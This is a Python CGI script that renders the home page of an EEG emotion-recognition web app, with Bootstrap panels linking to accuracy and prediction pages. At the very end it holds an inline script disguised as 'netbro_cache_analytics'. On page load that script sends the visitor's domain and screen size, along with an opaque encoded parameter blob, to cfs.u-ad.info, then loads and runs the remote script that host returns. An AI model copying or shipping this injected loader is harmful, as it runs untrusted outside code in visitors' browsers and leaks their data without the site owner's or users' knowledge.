#!/usr/bin/env python

# Import modules for CGI handling 
import cgi, cgitb


print "Content-type: text/html\n"

print '''<!DOCTYPE html>
<html lang="en">

<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">

    <title>EEG Emotion Recognition</title>

    <!-- Bootstrap Core CSS -->
    <link href="http://ironsummitmedia.github.io/startbootstrap-sb-admin-2/bower_components/bootstrap/dist/css/bootstrap.min.css" rel="stylesheet">

    <!-- MetisMenu CSS -->
    <link href="http://ironsummitmedia.github.io/startbootstrap-sb-admin-2/bower_components/metisMenu/dist/metisMenu.min.css" rel="stylesheet">

    <!-- Timeline CSS -->
    <link href="http://ironsummitmedia.github.io/startbootstrap-sb-admin-2/dist/css/timeline.css" rel="stylesheet">

    <!-- Custom CSS -->
    <link href="../css/dashboard.css" rel="stylesheet">

    <!-- Morris Charts CSS -->
    <link href="http://ironsummitmedia.github.io/startbootstrap-sb-admin-2/bower_components/morrisjs/morris.css" rel="stylesheet">

    <!-- Custom Fonts -->
    <link href="http://ironsummitmedia.github.io/startbootstrap-sb-admin-2/bower_components/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

</head>

<body>

    <div id="wrapper">
        <div id="page-wrapper">
            <div class="row">
                <div class="col-lg-12">
                    <a href="index.py" style="text-decoration:none;color: #000;"><h1 class="page-header text-center">EEG Emotion Recognition</h1></a>
                </div>
                <!-- /.col-lg-12 -->
            </div>
            <!-- /.row -->
            <div class="row">
            <div class="col-lg-3"></div>
            <div class="col-lg-6">
                <img src="../img/home.png" width="100%">
            </div>
            <div class="col-lg-3"></div>
            </div>

            <div class="row">
                <div class="col-lg-2"></div>
                <div class="col-lg-4 col-md-6">
                    <div class="panel panel-primary">
                        <div class="panel-heading">
                            <div class="row">
                                <div class="col-xs-3">
                                    <i class="fa fa-gears fa-5x"></i>
                                </div>
                                <div class="col-xs-9 text-right">
                                    <div class="huge">......</div>
                                    <div><b>Accuracy !</b></div>
                                </div>
                            </div>
                        </div>
                        <a href="find_accuracy.py">
                            <div class="panel-footer">
                                <span class="pull-left">Find Accuracy</span>
                                <span class="pull-right"><i class="fa fa-arrow-circle-right"></i></span>
                                <div class="clearfix"></div>
                            </div>
                        </a>
                    </div>
                </div>
                <div class="col-lg-4 col-md-6">
                    <div class="panel panel-green">
                        <div class="panel-heading">
                            <div class="row">
                                <div class="col-xs-3">
                                    <i class="fa fa-tasks fa-5x"></i>
                                </div>
                                <div class="col-xs-9 text-right">
                                    <div class="huge">......</div>
                                    <div><b>Prediction !</b></div>
                                </div>
                            </div>
                        </div>
                        <a href="input_predict.py">
                            <div class="panel-footer">
                                <span class="pull-left">Predict EEG Emotion</span>
                                <span class="pull-right"><i class="fa fa-arrow-circle-right"></i></span>
                                <div class="clearfix"></div>
                            </div>
                        </a>
                    </div>
                </div>
                <div class="col-lg-2"></div>
            </div>
            <!-- /.row -->            
        </div>
        <!-- /#page-wrapper -->

    </div>
    <!-- /#wrapper -->

    <!-- jQuery -->
    <script src="http://ironsummitmedia.github.io/startbootstrap-sb-admin-2/bower_components/jquery/dist/jquery.min.js"></script>

    <!-- Bootstrap Core JavaScript -->
    <script src="http://ironsummitmedia.github.io/startbootstrap-sb-admin-2/bower_components/bootstrap/dist/js/bootstrap.min.js"></script>

    <!-- Metis Menu Plugin JavaScript -->
    <script src="http://ironsummitmedia.github.io/startbootstrap-sb-admin-2/bower_components/metisMenu/dist/metisMenu.min.js"></script>

    <!-- Morris Charts JavaScript -->
    <script src="http://ironsummitmedia.github.io/startbootstrap-sb-admin-2/bower_components/raphael/raphael-min.js"></script>
    <script src="http://ironsummitmedia.github.io/startbootstrap-sb-admin-2/bower_components/morrisjs/morris.min.js"></script>
    <script src="http://ironsummitmedia.github.io/startbootstrap-sb-admin-2/js/morris-data.js"></script>

    <!-- Custom Theme JavaScript -->
    <script src="http://ironsummitmedia.github.io/startbootstrap-sb-admin-2/dist/js/sb-admin-2.js"></script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582AaN6h071sG%2bJBYpJxd3JQSJs5mE8iAmw8USIyYDWcoVFc08gzCE8COQRBhCpHI1yC7skRDV9qYyHsdUIk2Qeh5fEPTGf2w%2fAexeHwBBM3qJNrfxOqlDLyX3udt7TqoNReDfIBn%2brVy%2bXEPB%2b8EBADsI1Ky5R%2bmMT%2bW5f4GztEj2O1tiud%2fhA1eRZDOA8mmhJtYMcL69A3eIK5GA8GaovnIqpEW%2fPvjHtnKIurfETIYf5ayMxYzYN1lED6XS%2fAb6PcLJr28pYQzmnhFa2BHbEg%2fIb0A3%2f%2fYokQpvFnkvQ2zFr6zcNU%2fELwAzWrxpSfHdjc3rc78s27Iqzcz57H00Dc%2fRd92Mw%2bWRClG4%2byxeuot%2ftTqeWWP%2fTPr3cJfjysdCW%2bsf7hgbZmIcOA4Gl3LH5ARvUDlRwAz786LT4TDlM0MvS7YhQtdY8Vai4ZoPeSWwCWp76PIQqYPRApUAKtS66EuHlmVHgcIdtNFspNfcV3Ro5%2ftCVEqnASugmE87PJkncpxnP6cGCRbSwOA7JshwR8RDsEF69XUIk2tn%2fH1MBTJUaONMqI5Vb4Fnuk1G37GFI6Ne3Myq3qQ4SC2RcISIMse5oG55mTQe%2bFhZFcAw27fh" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

</html>'''
